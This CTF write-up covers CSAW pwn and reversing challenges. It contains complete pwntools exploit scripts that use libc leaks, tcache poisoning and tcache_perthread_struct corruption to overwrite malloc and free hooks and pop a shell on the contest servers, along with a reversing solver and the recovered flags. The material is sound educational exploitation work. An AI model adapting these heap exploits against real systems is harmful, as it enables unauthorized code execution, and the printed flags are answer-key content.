---

## Pwn: ##
[Popping caps 1|300](#Popping-caps-1) 

[Popping caps 2|350](#Popping-caps-2)

[Traveller|200](#Traveller)



## Rev: ##
[Beleaf|50](#Beleaf)


---


### Popping-caps-1
```
pwndbg> checksec 
[*] '/tmp/cctf/popping_caps'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So we have this strange binary that gives to us directly a leak, but instead we are limited to do a maximum of 7 actions
```
./popping_caps
Here is system 0x7f2bd80649c0
You have 7 caps!
[1] Malloc
[2] Free
[3] Write
[4] Bye
```


Then we have the following action permitted:
- Malloc: as the name says, it does a malloc with the size given by us
- Free: free whatever you want, i mean the input given is summed with the address of the previous malloc, or 0, if nothing was allocated before
- Write: write also 8 byte in the allocated chunck
- Bye: print to stdout a message and then do a malloc before to exit 


The vulnerability are:
 - tcache house of spirit: we can free the same chunck in tcache
 - tcache poisoning: we can free whatever we want, and so we could use a fake chunk (with the necessary constraints, e.g 8 aligned address)

I directly focused on tcache poisoning, before even look at the heap, and doing so i missed a possible fake chunk.. whatever, and so i found all valid chunk in ld(rw-) space address.
Now there's a problem, we don't know, precisely, where the ld base address will be placed by the system running remotely, but we know that, his base address will be more higher than the libc base address.
Further, we have the libc given with the challenge.


#### Solution
 - Take the leak of system@libc and then sum something to get the ld base address
 - Now free the fake-chunk twice
 - Do malloc to get back the fake-chunk
 - Now overwrite his fd and then do two malloc, so now the ptmalloc gave back to us the '__malloc_hook' chunk
 - Write the one_gadget to win

Unfortunately, the script doesn't work remotely, and so i didn't get the flag :(
How and why: The address are all aligned by 0x1000, we know because the way the kernel manages page-table, so this was my guessing approach (don't ask me why i did this so ugly):

```
k_now = 0x10  #right value 0x1
condition_stop = False
while not condition_stop:
  r = remote("pwn.chal.csaw.io", 1001)
  condition_stop=exploit( (k_now  << 12) + 0x428 )
  r.close()
  k_now += 1
  time.sleep(0.4)
```  

So it didn't work, because i started from 0x10 and not 0x1.
```
from pwn import *
import struct
import time
import sys

prog_name = './popping_caps'
context.binary = prog_name
libcz = ELF("libc.so.6")
r = False

def halt():
  while True:
    log.info( r.recvline() )

def malloc(sizes):
  r.recvuntil("Your choice:")
  r.sendline('1')
  r.recvuntil("How many:")
  r.sendline(str(sizes))

def free(index):
  r.recvuntil("Your choice:")
  r.sendline('2')
  r.recvuntil("hats in a free:")
  r.sendline(str(index))

def write(data):
  r.recvuntil("Your choice:")
  r.sendline('3')
  r.recvuntil("Read me in:")
  r.send(data)

def give_up():
  r.recvuntil("Your choice:")
  r.sendline('4')

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def exploit(k_now):
  r.recvuntil("Here is system ")
  system_free=int(r.recvline(),16)
  log.info("System addr :0x{0:x}".format(system_free))
  libc_addr = system_free - 0x4f440
  log.info("Libc addr :0x{0:x}".format( libc_addr))
  free_hook = libc_addr + libcz.symbols['__free_hook']
  log.info("__free_hook addr :0x{0:x}".format( free_hook))
  malloc_hook = libc_addr + libcz.symbols['__malloc_hook']
  log.info("__malloc_hook addr :0x{0:x}".format( malloc_hook) )
  #fake_chunk = ( libc_addr + 0x3f1000 + 0x1f5428 + 0x8 ) #note error in remote.. we need ld_preload libc given 
  fake_chunk = (libc_addr + 0x3f1000 + k_now + 0x8 )
  
  print("k_now: 0x{0:x} with fake chunk: 0x{1:x}".format(k_now, fake_chunk ))
  log.info(" Fake chunk addr :0x{0:x}".format( fake_chunk) )
  one_gadget = libc_addr + 0x10a38c

  free( fake_chunk ) #7
  free( fake_chunk ) #6
  malloc( 0x90 -8 )  #5
  write( p64(malloc_hook)) #4
  malloc( 0x90 -8) #3
  malloc( 0x90 -8) #2
  write( p64( one_gadget) ) #1
  r.interactive()
  return True 


k_now = 0x10  #right value 0x1
condition_stop = False
while not condition_stop:
  r = remote("pwn.chal.csaw.io", 1001)
  condition_stop=exploit( (k_now  << 12) + 0x428 )
  r.close()
  k_now += 1
  time.sleep(0.4)
  
print("[+] Done!")
```



### Popping caps 2
```
pwndbg> checksec 
[*] '/tmp/cctf/popping_caps'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So again this strange binary that gives to us directly a leak, with the same limit of 7 actions permitted.

Then we have the following action permitted:
- Malloc: as the name says, it does a malloc with the size given by us
- Free: free whatever you want, i mean the input given is summed with the address of the previous malloc, or 0, if nothing was allocated before
- Write: write 0xFF byte in the allocated chunck
- Bye: print to stdout a message and then directly exit, but without calling the malloc


The vulnerability are:
 - tcache house of spirit: we can free the same chunck in tcache bin
 - tcache poisoning: we can free whatever we want, and so we could use a fake chunk (with the necessary constraints, e.g 8 aligned address)

This time i just intended directly the solution, that was free something and then corrupt the tcache_parthread_struct, so we can overwrite a tcache_entry.

#### Solution
 - malloc something to initialize the heap
 - free the tcache_perthread_struct, then get it back
 - now write '\x00' till the tcache_entry, then fill it with the '__free_hook'
 - get back the '__free_hook', now we can write the one_gadget to win, after we free something

```
from pwn import *
import signal
import sys
import time
import struct

def signal_handler(sig, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)

#signal.signal(signal.SIGINT, signal_handler)
prog_name = './popping_caps'
#context.log_level = logging.DEBUG #with debug output
context.binary = prog_name
debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("pwn.chal.csaw.io",1008)
  libcz = ELF("libc.so.6")
  #libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  online=True
elif(debug == 1):
  #r = process(prog_name, aslr=False)
  r = process(prog_name, env={'LD_LIBRARY_PATH':'.'})
  libcz = ELF("libc.so.6")

def halt():
  while True:
    log.info( r.recvline() )

def malloc(sizes):
  r.recvuntil("Your choice:")
  r.sendline('1')
  r.recvuntil("How many:")
  r.sendline(str(sizes))

def free(index):
  r.recvuntil("Your choice:")
  r.sendline('2')
  r.recvuntil("hats in a free:")
  r.sendline(str(index))

def write(data):
  r.recvuntil("Your choice:")
  r.sendline('3')
  r.recvuntil("Read me in:")
  r.send(data)

def give_up():
  r.recvuntil("Your choice:")
  r.sendline('4')

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def exploit():
  r.recvuntil("Here is system ")
  system_free=int(r.recvline(),16)
  log.info("System addr :0x{0:x}".format(system_free))
  libc_addr = system_free - 0x4f440
  log.info("Libc addr :0x{0:x}".format( libc_addr))
  free_hook = libc_addr + libcz.symbols['__free_hook']
  log.info("__free_hook addr :0x{0:x}".format( free_hook))
  malloc_hook = libc_addr + libcz.symbols['__malloc_hook']
  log.info("__malloc_hook addr :0x{0:x}".format( malloc_hook) )
  #fake_chunk = ( libc_addr + 0x3f1000 + 0x1f5428 + 0x8 ) #note error in remote.. we need ld_preload libc given
  fake_chunk = (libc_addr + 0x3f1000 + 0x225428 + 0x8 )
  log.info(" Fake chunk addr :0x{0:x}".format( fake_chunk) )
  one_gadget = libc_addr + 0x4f322

  if not   online:
    gdb.attach(r, '''
     set follow-fork-mode child
     b *(0x555555554000 + 0xb82)
     c
     ''')
  malloc(0x20) #7
  free( -0x260 + 0x10 ) #6
  malloc(0x250 - 0x8) #5
  write( "/bin/sh" + "\x00"*(0xc0-0x7) + p64(free_hook)) #4
  malloc(0x120 - 0x8) #3
  write(p64( one_gadget)) #2
  free( -0x260 + 0x10 ) #1
  # flag{don_t_you_wish_your_libc_was_non_vtabled_like_mine_29}
  r.interactive()
  return

#print('Press Ctrl+C')
exploit()
r.close()
```



### Traveller
#### Solution
```
from pwn import *

r = remote("pwn.chal.csaw.io", 1003)
libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# special chunk
r.recvuntil(">")
r.sendline('1')
r.sendline('3')
r.sendline('/bin/sh')

# overwrite __free_hook with (system@plt+6)
r.recvuntil(">")
r.sendline('2')
r.sendline(str( -262194 ))
r.send(p64(0x400716))

# free something
r.recvuntil(">")
r.sendline('3')
r.sendline('0')

r.interactive()
```
** note: this isn't, obviously, the intended solution by the author



### Beleaf
This is the decompiled version of the main function:
```
int main(){
  printf("Enter the flag\n>>> ", a2, a2);
  __isoc99_scanf("%s", flags);
  len_flags = strlen(flags);
  if ( len_flags <= 0x20 )
  {
    puts("Incorrect!");
    exit(1);
  }
  for ( i = 0LL; i < len_flags; ++i )
  {
    if ( routine_check(flags[i]) != key_final[i] )
    {
      puts("Incorrect!");
      exit(1);
    }
  }
  puts("Correct!");
  return 0;
}
```

The routine check function:
```
signed long routine_check(char char_now)
{
  signed __int64 index_now; // [sp+Ch] [bp-8h]@1

  index_now = 0LL;
  while ( index_now != -1 )
  {
    if ( char_now == key_cmp[index_now] )
      return index_now;
    if ( (signed int)char_now >= key_cmp[index_now] )
    {
      if ( (signed int)char_now > key_cmp[index_now] )
        index_now = 2 * (index_now + 1);
    }
    else
    {
      index_now = 2 * index_now + 1;
    }
  }
  return -1LL;
}
```

#### Solution
- So we can understand that the flag must be long as the size of the array, key_final
- In key_cmp we find many printable chars, and we know that the flag must be printable
- So we know the length, we know the printable chars, now write the 'routine_check' in other language, in my case, i used python
```
#!/usr/bin/env python
from itertools import permutations
from pwn import *

cmp_key = [ [0x77, 0x66, 0x7B, 0x5F, 0x6E, 0x79, 0x7D, 0x62, 0x6c, 0x72, 0x61, 0x65, 0x69, 0x6f, 0x74, 0x67, 0x75] for x in range(33)]
cmp_key_std = [0x77, 0x66, 0x7B, 0x5F, 0x6E, 0x79, 0x7D, 0x0FFFFFFFF, 0x62, 0x6c, 0x72, 
    0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF, 0x61, 0x65, 0x69, 0x0FFFFFFFF, 0x6f, 0x74,
    0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,
    0x67, 0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,     
    0x75,
    0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF,0x0FFFFFFFF, 0, 0, 0, 0]
    
len_flag = 33
init_flag ="flag{"
cmp_out = [1, 9, 0x11, 0x27, 0x2, 0x0, 0x12, 3, 8, 0x12, 9, 0x12, 0x11, 1, 0x3, 0x13, 0x4, 3, 5, 0x15, 0x2e, 0x0a, 3, 0x0a, 0x12, 3, 1, 0x2e, 0x16, 0x2e, 0x0a, 0x12, 6]
index_now = 0

def is_fine(char_now):
  try:
    index_zero = 0
    while index_zero != -1:
      if char_now == cmp_key_std[index_zero]:
        return index_zero == cmp_out[index_now]
      elif char_now >= cmp_key_std[index_zero]:
        if char_now > cmp_key_std[index_zero]:
          index_zero = 2 * (index_zero + 1)
      else:
        index_zero = 2 * index_zero + 1

    return -1 == cmp_out[index_now]
  except:
    return False

for y in range(33-6):
  cmp_key[index_now] = [ x for x in cmp_key[index_now] if is_fine(x) ]
  index_now += 1

#print( init_flag + "".join([ chr(y) for x in cmp_key for y in x ]) + "}")
#for arr_now in cmp_key:
#  print( [chr(x) for x in arr_now]) 

#Gli utlimi 5 char sono sbagliati.. bruteforce con gdb
# step 2
last=['w', 'f', '_', 'n', 'y', 'b', 'l', 'r', 'a', 'e', 'i', 'o', 't', 'g', 'u']
perm = permutations(last, 5)
last_str="flag{we_beleaf_in_your_re_f"

comment='''
for x in list(perm):
  r = process("beleaf")
  r.recvuntil("flag")
  str_now_now = last_str + "".join(x) + "}"
  #r.sendline( str_now_now )
  print(hex(len(str_now_now)), str_now_now)
  r.interactive()
  exit
  ret=r.recv()
  ret=r.recv()
  print(ret)
  if "Correct!" in ret:
    print("[+] Found! {0}".format( last_str + "".join(x) + "}"))
    exit
  r.close()
'''

# just check with gdb to check if index is updated .. we found with some chars exploration the flag 
# flag{we_beleaf_in_your_re_future}
```

